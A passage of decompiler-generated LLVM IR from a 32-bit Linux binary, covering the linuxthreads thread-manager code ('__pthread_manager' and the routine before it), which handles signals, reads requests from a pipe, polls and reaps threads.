  store i32 %v3_804b92c, i32* %v3_804b92f, align 4
  %v0_804b932 = load i32, i32* @esi, align 4
  %v1_804b932 = add i32 %v0_804b932, 4
  %v2_804b932 = inttoptr i32 %v1_804b932 to i32*
  %v3_804b932 = load i32, i32* %v2_804b932, align 4
  %v0_804b935 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b935 = inttoptr i32 %v3_804b932 to i32*
  store i32 %v0_804b935, i32* %v2_804b935, align 4
  %v0_804b937 = load i32, i32* @esi, align 4
  %v1_804b937 = add i32 %v0_804b937, 28
  %v2_804b937 = inttoptr i32 %v1_804b937 to i32*
  %v3_804b937 = load i32, i32* %v2_804b937, align 4
  store i32 %v3_804b937, i32* @eax, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v0_804b93c = load i32, i32* %stack_var_-8, align 4
  %v1_804b93c = call i32 @__pthread_lock(i32 %v0_804b93c)
  %v0_804b941 = load i32, i32* @esi, align 4
  %v1_804b941 = add i32 %v0_804b941, 412
  %v2_804b941 = inttoptr i32 %v1_804b941 to i32*
  %v3_804b941 = load i32, i32* %v2_804b941, align 4
  %v4_804b941 = icmp eq i32 %v3_804b941, 0
  store i1 %v4_804b941, i1* %zf.global-to-local, align 1
  %v1_804b948 = add i32 %v0_804b941, 46
  %v2_804b948 = inttoptr i32 %v1_804b948 to i8*
  store i8 1, i8* %v2_804b948, align 1
  %v0_804b94c = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804b94c, label %dec_label_pc_804b979, label %dec_label_pc_804b94e

dec_label_pc_804b94e:                             ; preds = %dec_label_pc_804b92c
  %v0_804b94e = load i32, i32* @global_var_80679f4.148, align 4
  %v1_804b953 = load i32, i32* @esi, align 4
  %v2_804b953 = add i32 %v1_804b953, 416
  %v3_804b953 = inttoptr i32 %v2_804b953 to i32*
  %v4_804b953 = load i32, i32* %v3_804b953, align 4
  %v5_804b953 = or i32 %v4_804b953, %v0_804b94e
  store i32 %v5_804b953, i32* @eax, align 4
  %v3_804b959 = and i32 %v5_804b953, 2048
  %v4_804b959 = icmp eq i32 %v3_804b959, 0
  store i1 %v4_804b959, i1* %zf.global-to-local, align 1
  br i1 %v4_804b959, label %dec_label_pc_804b979, label %dec_label_pc_804b95e

dec_label_pc_804b95e:                             ; preds = %dec_label_pc_804b94e
  %v1_804b95e = add i32 %v1_804b953, 424
  %v2_804b95e = inttoptr i32 %v1_804b95e to i32*
  store i32 12, i32* %v2_804b95e, align 4
  %v0_804b968 = load i32, i32* @esi, align 4
  %v2_804b968 = add i32 %v0_804b968, 428
  %v3_804b968 = inttoptr i32 %v2_804b968 to i32*
  store i32 %v0_804b968, i32* %v3_804b968, align 4
  %v0_804b96e = load i32, i32* @esi, align 4
  store i32 %v0_804b96e, i32* @global_var_80679fc.149, align 4
  %v0_804b974 = call i32 @__linuxthreads_reap_event()
  br label %dec_label_pc_804b979

dec_label_pc_804b979:                             ; preds = %dec_label_pc_804b94e, %dec_label_pc_804b92c, %dec_label_pc_804b95e
  %v0_804b979 = load i32, i32* @esp, align 4
  %v9_804b979 = icmp eq i32 %v0_804b979, 12
  store i1 %v9_804b979, i1* %zf.global-to-local, align 1
  %v0_804b97c = load i32, i32* @esi, align 4
  %v1_804b97c = add i32 %v0_804b97c, 45
  %v2_804b97c = inttoptr i32 %v1_804b97c to i8*
  %v3_804b97c = load i8, i8* %v2_804b97c, align 1
  %v4_804b97c = sext i8 %v3_804b97c to i32
  store i32 %v4_804b97c, i32* @ebx, align 4
  %v1_804b980 = add i32 %v0_804b97c, 28
  %v2_804b980 = inttoptr i32 %v1_804b980 to i32*
  %v3_804b980 = load i32, i32* %v2_804b980, align 4
  %v1_804b983 = inttoptr i32 %v3_804b980 to i32*
  %v2_804b983 = call i32 @__pthread_unlock(i32* %v1_804b983)
  %v1_804b98b = icmp eq i8 %v3_804b97c, 0
  store i1 %v1_804b98b, i1* %zf.global-to-local, align 1
  br i1 %v1_804b98b, label %dec_label_pc_804b99e, label %dec_label_pc_804b98f

dec_label_pc_804b98f:                             ; preds = %dec_label_pc_804b979
  %v0_804b98f = load i32, i32* @esi, align 4
  store i32 %v0_804b98f, i32* @eax, align 4
  %v0_804b991 = call i32 @pthread_free()
  br label %dec_label_pc_804b99e

dec_label_pc_804b99a:                             ; preds = %dec_label_pc_804b925, %dec_label_pc_804b91b
  %v0_804b92c = phi i32 [ %v0_804b91b, %dec_label_pc_804b91b ], [ %v2_804b928, %dec_label_pc_804b925 ]
  store i32 %v0_804b92c, i32* @esi, align 4
  %v12_804b99a = icmp eq i32 %v0_804b92c, %v0_804b91b
  %v1_804b99c = icmp eq i1 %v12_804b99a, false
  br i1 %v1_804b99c, label %dec_label_pc_804b925, label %dec_label_pc_804b99e.loopexit

dec_label_pc_804b99e.loopexit:                    ; preds = %dec_label_pc_804b99a
  store i1 %v12_804b99a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804b99e

dec_label_pc_804b99e:                             ; preds = %dec_label_pc_804b99e.loopexit, %dec_label_pc_804b979, %dec_label_pc_804b98f
  %v0_804b99e = load i32, i32* @global_var_8063248.141, align 8
  %v1_804b99e = icmp eq i32 %v0_804b99e, 0
  store i1 %v1_804b99e, i1* %zf.global-to-local, align 1
  br i1 %v1_804b99e, label %dec_label_pc_804b9b9, label %dec_label_pc_804b9a7

dec_label_pc_804b9a7:                             ; preds = %dec_label_pc_804b99e
  %v0_804b9a7 = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  store i32 %v0_804b9a7, i32* %edx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 %v0_804b9a7, i32* @eax, align 4
  %v0_804b9b4 = call i32 @restart()
  br label %dec_label_pc_804b9b9

dec_label_pc_804b9b9:                             ; preds = %dec_label_pc_804b99e, %dec_label_pc_804b9a7
  %v3_804b9b9 = load i32, i32* %stack_var_-12, align 4
  %v1_804b9bf = trunc i32 %v3_804b9b9 to i8
  %v2_804b9bf = urem i8 %v1_804b9bf, -128
  %v2_804b9c1 = add nuw i8 %v2_804b9bf, 1
  %v2_804b9c1.off = add nuw i8 %v2_804b9bf, 2
  %tmp = icmp ult i8 %v2_804b9c1.off, 3
  store i1 %tmp, i1* %zf.global-to-local, align 1
  %tmp21 = icmp slt i8 %v2_804b9c1, 2
  br i1 %tmp21, label %dec_label_pc_804b9e2, label %dec_label_pc_804b9c9

dec_label_pc_804b9c9:                             ; preds = %dec_label_pc_804b9b9
  %v1_804b9c9 = urem i32 %v3_804b9b9, 128
  %v2_804b9c9 = icmp eq i32 %v1_804b9c9, 0
  store i1 %v2_804b9c9, i1* %zf.global-to-local, align 1
  store i32 %v1_804b9c9, i32* @ecx, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v1_804b9c9, i32* @eax, align 4
  %v0_804b9d3 = call i32 @pthread_kill_all_threads()
  %v0_804b9d8 = load i32, i32* @esp, align 4
  %v9_804b9d8 = icmp eq i32 %v0_804b9d8, 12
  store i1 %v9_804b9d8, i1* %zf.global-to-local, align 1
  %v1_804b9dd = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b9e2:                             ; preds = %dec_label_pc_804b9b9, %entry
  %v3_804b9ef = call i32 @__libc_waitpid(i32 -1, i32 %v2_804b9e8, i32 -2147483647)
  %v1_804b9f7 = icmp eq i32 %v3_804b9ef, 0
  store i1 %v1_804b9f7, i1* %zf.global-to-local, align 1
  %tmp22 = icmp slt i32 %v3_804b9ef, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_804b91b, label %dec_label_pc_804b9ff

dec_label_pc_804b9ff:                             ; preds = %dec_label_pc_804b9e2
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_804ba02 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ba02, i32* @ebx, align 4
  store i32 %v0_804b911, i32* @esi, align 4
  ret i32 %v3_804b9ef

; uselistorder directives
  uselistorder i32 %v3_804b9ef, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804b9c9, { 2, 1, 0 }
  uselistorder i1 %v12_804b99a, { 1, 0 }
  uselistorder i32 %v0_804b92c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_804b968, { 1, 0 }
  uselistorder i1 %v4_804b959, { 1, 0 }
  uselistorder i32 %v2_804b928, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 13, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 14 }
  uselistorder label %dec_label_pc_804b9b9, { 1, 0 }
  uselistorder label %dec_label_pc_804b99e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b979, { 2, 0, 1 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ba05 = load i32, i32* @ebp, align 4
  %v0_804ba06 = load i32, i32* @edi, align 4
  %v0_804ba07 = load i32, i32* @esi, align 4
  %v0_804ba08 = load i32, i32* @ebx, align 4
  store i32 %v0_804ba08, i32* %stack_var_-16, align 4
  %v2_804ba0f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804ba0f, i32* @ebx, align 4
  store i32 %v2_804ba0f, i32* %stack_var_-364, align 4
  store i32 ptrtoint (i32* @global_var_80628e8.150 to i32), i32* bitcast (i32** @global_var_80628e4.151 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_80628f0.153 to i32), i32* @global_var_80628ec.152, align 4
  %v1_804ba2b = call i32 @sigfillset(i32 %v2_804ba0f)
  store i32 %v1_804ba2b, i32* %eax.global-to-local, align 4
  %v0_804ba32 = load i32, i32* @global_var_8062a8c.154, align 4
  store i32 %v2_804ba0f, i32* %stack_var_-364, align 4
  %v1_804ba39 = call i32 @__GI_sigdelset(i32 %v2_804ba0f)
  store i32 %v1_804ba39, i32* %eax.global-to-local, align 4
  store i32 %v2_804ba0f, i32* %ecx.global-to-local, align 4
  store i32 %v0_804ba32, i32* @esi, align 4
  store i32 %v2_804ba0f, i32* %stack_var_-364, align 4
  %v1_804ba43 = call i32 @__GI_sigdelset(i32 %v2_804ba0f)
  %v0_804ba48 = load i32, i32* @global_var_8067a00.144, align 512
  store i32 %v0_804ba48, i32* %eax.global-to-local, align 4
  %v1_804ba50 = icmp eq i32 %v0_804ba48, 0
  br i1 %v1_804ba50, label %dec_label_pc_804ba69, label %dec_label_pc_804ba54

dec_label_pc_804ba54:                             ; preds = %entry
  %v0_804ba54 = load i32, i32* @global_var_8062a90.145, align 16
  store i32 %v0_804ba54, i32* %eax.global-to-local, align 4
  %tmp48 = icmp slt i32 %v0_804ba54, 1
  br i1 %tmp48, label %dec_label_pc_804ba69, label %dec_label_pc_804ba5d

dec_label_pc_804ba5d:                             ; preds = %dec_label_pc_804ba54
  store i32 %v2_804ba0f, i32* %stack_var_-364, align 4
  %v1_804ba61 = call i32 @__GI_sigdelset(i32 %v2_804ba0f)
  store i32 %v1_804ba61, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ba69

dec_label_pc_804ba69:                             ; preds = %dec_label_pc_804ba54, %entry, %dec_label_pc_804ba5d
  store i32 %v2_804ba0f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-364, align 4
  %v3_804ba76 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804ba76 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804ba76, i32 0)
  %v0_804ba7b = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  store i32 %v0_804ba7b, i32* %eax.global-to-local, align 4
  store i32 2, i32* @edi, align 4
  %v3_804ba81 = load i32, i32* @global_var_8062a98.155, align 4
  store i32 %v3_804ba81, i32* %stack_var_-364, align 4
  %v1_804ba84 = call i32 @__pthread_manager_adjust_prio(i32 %v3_804ba81)
  store i32 %v1_804ba84, i32* %eax.global-to-local, align 4
  %v2_804ba92 = ptrtoint i32* %stack_var_-300 to i32
  br label %dec_label_pc_804ba8c

dec_label_pc_804ba8c:                             ; preds = %dec_label_pc_804baa9, %dec_label_pc_804ba69
  store i32 %v2_804ba92, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-364, align 4
  %v3_804ba9e = call i32 @__libc_read(i32 %arg1, i32 %v2_804ba92, i32 148)
  %v1_804baa6 = add i32 %v3_804ba9e, 1
  %v8_804baa6 = icmp eq i32 %v1_804baa6, 0
  store i32 %v1_804baa6, i32* %eax.global-to-local, align 4
  %v1_804baa7 = icmp eq i1 %v8_804baa6, false
  br i1 %v1_804baa7, label %dec_label_pc_804bab3, label %dec_label_pc_804baa9

dec_label_pc_804baa9:                             ; preds = %dec_label_pc_804ba8c
  %v0_804baa9 = load i32, i32* %stack_var_-364, align 4
  %v1_804baa9 = call i32 @__errno_location(i32 %v0_804baa9)
  store i32 %v1_804baa9, i32* %eax.global-to-local, align 4
  %v1_804baae = inttoptr i32 %v1_804baa9 to i32*
  %v2_804baae = load i32, i32* %v1_804baae, align 4
  %v11_804baae = icmp eq i32 %v2_804baae, 4
  br i1 %v11_804baae, label %dec_label_pc_804ba8c, label %dec_label_pc_804bab3

dec_label_pc_804bab3:                             ; preds = %dec_label_pc_804baa9, %dec_label_pc_804ba8c
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804bf97 = inttoptr i32 %arg1 to i32*
  %v4_804bcbb = inttoptr i32 %arg1 to i8*
  %v4_804bdde = inttoptr i32 %arg1 to i16*
  br label %dec_label_pc_804bacbthread-pre-split

dec_label_pc_804bacbthread-pre-split:             ; preds = %dec_label_pc_804c023, %dec_label_pc_804bb15, %dec_label_pc_804bb18, %dec_label_pc_804bab3
  %v1_804bacb.pr = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bacb

dec_label_pc_804bacb:                             ; preds = %dec_label_pc_804bb22, %dec_label_pc_804c05e, %dec_label_pc_804bacbthread-pre-split
  %v1_804bacb = phi i32 [ %v1_804bacb.pr, %dec_label_pc_804bacbthread-pre-split ], [ %v1_804bb39, %dec_label_pc_804bb22 ], [ %v1_804c05e, %dec_label_pc_804c05e ]
  %v0_804bacb = load i32, i32* @ebx, align 4
  %v2_804bacb = add i32 %v1_804bacb, -4
  %v3_804bacb = inttoptr i32 %v2_804bacb to i32*
  store i32 %v0_804bacb, i32* %v3_804bacb, align 4
  %v1_804bacc = add i32 %v1_804bacb, -8
  %v2_804bacc = inttoptr i32 %v1_804bacc to i32*
  store i32 2000, i32* %v2_804bacc, align 4
  %v1_804bad1 = add i32 %v1_804bacb, -12
  %v2_804bad1 = inttoptr i32 %v1_804bad1 to i32*
  store i32 1, i32* %v2_804bad1, align 4
  %v1_804bad3 = add i32 %v1_804bacb, 324
  store i32 %v1_804bad3, i32* %eax.global-to-local, align 4
  %v2_804bada = add i32 %v1_804bacb, -16
  %v3_804bada = inttoptr i32 %v2_804bada to i32*
  store i32 %v1_804bad3, i32* %v3_804bada, align 4
  %v0_804badb = call i32 @__libc_poll()
  store i32 %v0_804badb, i32* %eax.global-to-local, align 4
  store i32 %v0_804badb, i32* @ebx, align 4
  %v1_804bae2 = call i32 @getppid(i32 %arg1)
  store i32 %v1_804bae2, i32* %eax.global-to-local, align 4
  %v9_804baea = icmp eq i32 %v1_804bae2, 1
  %v1_804baed = icmp eq i1 %v9_804baea, false
  br i1 %v1_804baed, label %dec_label_pc_804bafd, label %dec_label_pc_804baef

dec_label_pc_804baef:                             ; preds = %dec_label_pc_804bacb
  store i32 0, i32* @edx, align 4
  %v1_804baf1 = and i32 %v1_804bae2, -256
  %v2_804baf1 = or i32 %v1_804baf1, 9
  store i32 %v2_804baf1, i32* @eax, align 4
  %v0_804baf3 = call i32 @pthread_kill_all_threads()
  br label %dec_label_pc_804bff9

dec_label_pc_804bafd:                             ; preds = %dec_label_pc_804bacb
  %v0_804bafd = load i32, i32* @global_var_8063244.140, align 4
  store i32 %v0_804bafd, i32* %eax.global-to-local, align 4
  %v1_804bb02 = icmp eq i32 %v0_804bafd, 0
  br i1 %v1_804bb02, label %dec_label_pc_804bb15, label %dec_label_pc_804bb06

dec_label_pc_804bb06:                             ; preds = %dec_label_pc_804bafd
  store i32 0, i32* @global_var_8063244.140, align 4
  %v0_804bb10 = call i32 @pthread_reap_children()
  store i32 %v0_804bb10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb15

dec_label_pc_804bb15:                             ; preds = %dec_label_pc_804bafd, %dec_label_pc_804bb06
  %v0_804bb15 = load i32, i32* @ebx, align 4
  %v1_804bb15 = add i32 %v0_804bb15, -1
  %v8_804bb15 = icmp eq i32 %v1_804bb15, 0
  store i32 %v1_804bb15, i32* @ebx, align 4
  %v1_804bb16 = icmp eq i1 %v8_804bb15, false
  br i1 %v1_804bb16, label %dec_label_pc_804bacbthread-pre-split, label %dec_label_pc_804bb18

dec_label_pc_804bb18:                             ; preds = %dec_label_pc_804bb15
  %v0_804bb18 = load i32, i32* @esp, align 4
  %v1_804bb18 = add i32 %v0_804bb18, 330
  %v2_804bb18 = inttoptr i32 %v1_804bb18 to i8*
  %v3_804bb18 = load i8, i8* %v2_804bb18, align 1
  %v4_804bb18 = urem i8 %v3_804bb18, 2
  %v5_804bb18 = icmp eq i8 %v4_804bb18, 0
  br i1 %v5_804bb18, label %dec_label_pc_804bacbthread-pre-split, label %dec_label_pc_804bb22

dec_label_pc_804bb22:                             ; preds = %dec_label_pc_804bb18
  %v0_804bb22 = load i32, i32* @ecx, align 4
  %v2_804bb22 = add i32 %v0_804bb18, -4
  %v3_804bb22 = inttoptr i32 %v2_804bb22 to i32*
  store i32 %v0_804bb22, i32* %v3_804bb22, align 4
  %v1_804bb23 = add i32 %v0_804bb18, -8
  %v2_804bb23 = inttoptr i32 %v1_804bb23 to i32*
  store i32 148, i32* %v2_804bb23, align 4
  %v1_804bb28 = add i32 %v0_804bb18, 48
  store i32 %v1_804bb28, i32* %ecx.global-to-local, align 4
  %v2_804bb2c = add i32 %v0_804bb18, -12
  %v3_804bb2c = inttoptr i32 %v2_804bb2c to i32*
  store i32 %v1_804bb28, i32* %v3_804bb2c, align 4
  %v1_804bb2d = add i32 %v0_804bb18, 352
  %v2_804bb2d = inttoptr i32 %v1_804bb2d to i32*
  %v3_804bb2d = load i32, i32* %v2_804bb2d, align 4
  %v5_804bb2d = add i32 %v0_804bb18, -16
  %v6_804bb2d = inttoptr i32 %v5_804bb2d to i32*
  store i32 %v3_804bb2d, i32* %v6_804bb2d, align 4
  %v2_804bb34 = load i32, i32* %stack_var_-16, align 4
  %v4_804bb34 = call i32 @__libc_read(i32 %arg1, i32 1, i32 %v2_804bb34)
  store i32 %v4_804bb34, i32* %eax.global-to-local, align 4
  %v0_804bb39 = load i32, i32* @esp, align 4
  %v1_804bb39 = add i32 %v0_804bb39, 16
  %v1_804bb3c = add i32 %v0_804bb39, 68
  %v2_804bb3c = inttoptr i32 %v1_804bb3c to i32*
  %v3_804bb3c = load i32, i32* %v2_804bb3c, align 4
  store i32 %v3_804bb3c, i32* %eax.global-to-local, align 4
  switch i32 %v1_804bacb, label %dec_label_pc_804bacb [
    i32 0, label %dec_label_pc_804bb4e
    i32 1, label %dec_label_pc_804bf4b
    i32 2, label %dec_label_pc_804bfa1
    i32 3, label %dec_label_pc_804c003
    i32 4, label %dec_label_pc_804c02d
  ]

dec_label_pc_804bb4e:                             ; preds = %dec_label_pc_804bb22
  %v1_804bb4e = add i32 %v0_804bb39, 64
  %v2_804bb4e = inttoptr i32 %v1_804bb4e to i32*
  %v3_804bb4e = load i32, i32* %v2_804bb4e, align 4
  store i32 %v3_804bb4e, i32* %eax.global-to-local, align 4
  %v1_804bb52 = add i32 %v0_804bb39, 72
  %v2_804bb52 = inttoptr i32 %v1_804bb52 to i32*
  %v3_804bb52 = load i32, i32* %v2_804bb52, align 4
  store i32 %v3_804bb52, i32* @edi, align 4
  %v2_804bb56 = add i32 %v0_804bb39, 20
  %v3_804bb56 = inttoptr i32 %v2_804bb56 to i32*
  store i32 %v3_804bb4e, i32* %v3_804bb56, align 4
  %v0_804bb5a = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb5a = add i32 %v0_804bb5a, 412
  %v2_804bb5a = inttoptr i32 %v1_804bb5a to i32*
  %v3_804bb5a = load i32, i32* %v2_804bb5a, align 4
  store i32 %v3_804bb5a, i32* %edx.global-to-local, align 4
  %v1_804bb60 = load i32, i32* @esp, align 4
  %v2_804bb60 = add i32 %v1_804bb60, 24
  %v3_804bb60 = inttoptr i32 %v2_804bb60 to i32*
  store i32 %v3_804bb5a, i32* %v3_804bb60, align 4
  %v0_804bb64 = load i32, i32* @esp, align 4
  %v1_804bb64 = add i32 %v0_804bb64, 60
  %v2_804bb64 = inttoptr i32 %v1_804bb64 to i32*
  %v3_804bb64 = load i32, i32* %v2_804bb64, align 4
  store i32 %v3_804bb64, i32* %edx.global-to-local, align 4
  %v0_804bb68 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb68 = add i32 %v0_804bb68, 20
  %v2_804bb68 = inttoptr i32 %v1_804bb68 to i32*
  %v3_804bb68 = load i32, i32* %v2_804bb68, align 4
  store i32 %v3_804bb68, i32* %ecx.global-to-local, align 4
  %v1_804bb6b = add i32 %v0_804bb64, 64
  %v2_804bb6b = inttoptr i32 %v1_804bb6b to i32*
  %v3_804bb6b = load i32, i32* %v2_804bb6b, align 4
  store i32 %v3_804bb6b, i32* %eax.global-to-local, align 4
  %v2_804bb6f = add i32 %v0_804bb64, 36
  %v3_804bb6f = inttoptr i32 %v2_804bb6f to i32*
  store i32 %v3_804bb64, i32* %v3_804bb6f, align 4
  %v0_804bb73 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bb73 = load i32, i32* @esp, align 4
  %v2_804bb73 = add i32 %v1_804bb73, 28
  %v3_804bb73 = inttoptr i32 %v2_804bb73 to i32*
  store i32 %v0_804bb73, i32* %v3_804bb73, align 4
  %v0_804bb77 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb77 = load i32, i32* @esp, align 4
  %v2_804bb77 = add i32 %v1_804bb77, 32
  %v3_804bb77 = inttoptr i32 %v2_804bb77 to i32*
  store i32 %v0_804bb77, i32* %v3_804bb77, align 4
  %v1_804bb7b = call i32 @__GI_getpagesize(i32 %arg1)
  store i32 %v1_804bb7b, i32* %eax.global-to-local, align 4
  %v0_804bb80 = load i32, i32* @edi, align 4
  %v1_804bb80 = icmp eq i32 %v0_804bb80, 0
  store i32 %v1_804bb7b, i32* @ebp, align 4
  br i1 %v1_804bb80, label %dec_label_pc_804bb9e, label %dec_label_pc_804bb86

dec_label_pc_804bb86:                             ; preds = %dec_label_pc_804bb4e
  %v1_804bb86 = add i32 %v0_804bb80, 4
  %v2_804bb86 = inttoptr i32 %v1_804bb86 to i32*
  %v3_804bb86 = load i32, i32* %v2_804bb86, align 4
  %v4_804bb86 = icmp eq i32 %v3_804bb86, 0
  br i1 %v4_804bb86, label %dec_label_pc_804bb9e, label %dec_label_pc_804bb8c

dec_label_pc_804bb8c:                             ; preds = %dec_label_pc_804bb86
  %v0_804bb8c = call i32 @geteuid()
  store i32 %v0_804bb8c, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v1_804bb96 = icmp eq i32 %v0_804bb8c, 0
  %v1_804bb98 = icmp eq i1 %v1_804bb96, false
  br i1 %v1_804bb98, label %dec_label_pc_804bf3b, label %dec_label_pc_804bb9e

dec_label_pc_804bb9e:                             ; preds = %dec_label_pc_804bb8c, %dec_label_pc_804bb86, %dec_label_pc_804bb4e
  %v0_804bb9e = load i32, i32* @esp, align 4
  %v1_804bb9e = add i32 %v0_804bb9e, 20
  %v2_804bb9e = inttoptr i32 %v1_804bb9e to i32*
  store i32 2, i32* %v2_804bb9e, align 4
  %v0_804bba683 = load i32, i32* @esp, align 4
  %v1_804bba684 = add i32 %v0_804bba683, 20
  %v2_804bba685 = inttoptr i32 %v1_804bba684 to i32*
  %v3_804bba686 = load i32, i32* %v2_804bba685, align 4
  %tmp = icmp ult i32 %v3_804bba686, 1024
  br i1 %tmp, label %dec_label_pc_804bbb4, label %dec_label_pc_804bf24

dec_label_pc_804bbb4:                             ; preds = %dec_label_pc_804bb9e, %dec_label_pc_804bca7
  %v3_804bba696 = phi i32 [ %v3_804bba6, %dec_label_pc_804bca7 ], [ %v3_804bba686, %dec_label_pc_804bb9e ]
  %v0_804bba695 = phi i32 [ %v0_804bba6, %dec_label_pc_804bca7 ], [ %v0_804bba683, %dec_label_pc_804bb9e ]
  %v2_804bbb8 = mul i32 %v3_804bba696, 16
  store i32 %v2_804bbb8, i32* %eax.global-to-local, align 4
  %v1_804bbbb = add i32 %v2_804bbb8, 134604456
  %v2_804bbbb = inttoptr i32 %v1_804bbbb to i32*
  %v3_804bbbb = load i32, i32* %v2_804bbbb, align 8
  %v4_804bbbb = icmp eq i32 %v3_804bbbb, 0
  %v1_804bbc2 = icmp eq i1 %v4_804bbbb, false
  br i1 %v1_804bbc2, label %dec_label_pc_804bca7, label %dec_label_pc_804bbc8

dec_label_pc_804bbc8:                             ; preds = %dec_label_pc_804bbb4
  %v0_804bbc8 = load i32, i32* @edi, align 4
  %v1_804bbc8 = icmp eq i32 %v0_804bbc8, 0
  %v0_804bbca = load i32, i32* @global_var_806338c.133, align 4
  store i32 %v0_804bbca, i32* %ecx.global-to-local, align 4
  br i1 %v1_804bbc8, label %dec_label_pc_804bbfa, label %dec_label_pc_804bbd2

dec_label_pc_804bbd2:                             ; preds = %dec_label_pc_804bbc8
  %v1_804bbd2 = add i32 %v0_804bbc8, 24
  %v2_804bbd2 = inttoptr i32 %v1_804bbd2 to i32*
  %v3_804bbd2 = load i32, i32* %v2_804bbd2, align 4
  %v4_804bbd2 = icmp eq i32 %v3_804bbd2, 0
  br i1 %v4_804bbd2, label %dec_label_pc_804bbfa, label %dec_label_pc_804bbd8

dec_label_pc_804bbd8:                             ; preds = %dec_label_pc_804bbd2
  %v1_804bbd8 = add i32 %v0_804bbc8, 28
  %v2_804bbd8 = inttoptr i32 %v1_804bbd8 to i32*
  %v3_804bbd8 = load i32, i32* %v2_804bbd8, align 4
  store i32 %v3_804bbd8, i32* %edx.global-to-local, align 4
  store i32 %v3_804bbd8, i32* %eax.global-to-local, align 4
  %v2_804bbdf = add i32 %v0_804bbc8, 32
  %v3_804bbdf = inttoptr i32 %v2_804bbdf to i32*
  %v4_804bbdf = load i32, i32* %v3_804bbdf, align 4
  %v5_804bbdf = sub i32 %v3_804bbd8, %v4_804bbdf
  store i32 %v5_804bbdf, i32* @ebp, align 4
  %v1_804bbe2 = and i32 %v3_804bbd8, -4
  store i32 %v1_804bbe2, i32* %eax.global-to-local, align 4
  %v1_804bbe5 = add i32 %v1_804bbe2, -480
  store i32 %v1_804bbe5, i32* @esi, align 4
  store i32 1, i32* @global_var_80679f0.137, align 16
  br label %dec_label_pc_804bc95

dec_label_pc_804bbfa:                             ; preds = %dec_label_pc_804bbd2, %dec_label_pc_804bbc8
  %v1_804bbfa = add i32 %v0_804bba695, 40
  %v2_804bbfa = inttoptr i32 %v1_804bbfa to i32*
  store i32 2097152, i32* %v2_804bbfa, align 4
  %v0_804bc02 = load i32, i32* @esp, align 4
  %v1_804bc02 = add i32 %v0_804bc02, 40
  %v2_804bc02 = inttoptr i32 %v1_804bc02 to i32*
  %v3_804bc02 = load i32, i32* %v2_804bc02, align 4
  %v4_804bc02 = load i32, i32* @ebp, align 4
  %v5_804bc02 = sub i32 %v3_804bc02, %v4_804bc02
  store i32 %v5_804bc02, i32* %v2_804bc02, align 4
  %v0_804bc06 = load i32, i32* @edi, align 4
  %v1_804bc06 = icmp eq i32 %v0_804bc06, 0
  br i1 %v1_804bc06, label %dec_label_pc_804bbfa.dec_label_pc_804bc1f_crit_edge, label %dec_label_pc_804bc0a

dec_label_pc_804bbfa.dec_label_pc_804bc1f_crit_edge: ; preds = %dec_label_pc_804bbfa
  %v0_804bc1f.pre = load i32, i32* @esp, align 4
  %v0_804bc2b.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804bc1f

dec_label_pc_804bc0a:                             ; preds = %dec_label_pc_804bbfa
  %v0_804bc0a = load i32, i32* @ebp, align 4
  store i32 %v0_804bc0a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804bc0e = add i32 %v0_804bc06, 32
  %v3_804bc0e = inttoptr i32 %v2_804bc0e to i32*
  %v4_804bc0e = load i32, i32* %v3_804bc0e, align 4
  %v5_804bc0e = add i32 %v0_804bc0a, -1
  %v1_804bc11 = add i32 %v5_804bc0e, %v4_804bc0e
  %tmp49 = urem i32 %v1_804bc11, %v0_804bc0a
  store i32 %tmp49, i32* @edx, align 4
  %v4_804bc14 = sub i32 %v1_804bc11, %tmp49
  store i32 %v4_804bc14, i32* %eax.global-to-local, align 4
  %v0_804bc17 = load i32, i32* @esp, align 4
  %v1_804bc17 = add i32 %v0_804bc17, 40
  %v2_804bc17 = inttoptr i32 %v1_804bc17 to i32*
  %v3_804bc17 = load i32, i32* %v2_804bc17, align 4
  %v10_804bc17 = icmp ult i32 %v3_804bc17, %v4_804bc14
  store i32 %v4_804bc14, i32* @ebx, align 4
  %v1_804bc1d = icmp eq i1 %v10_804bc17, false
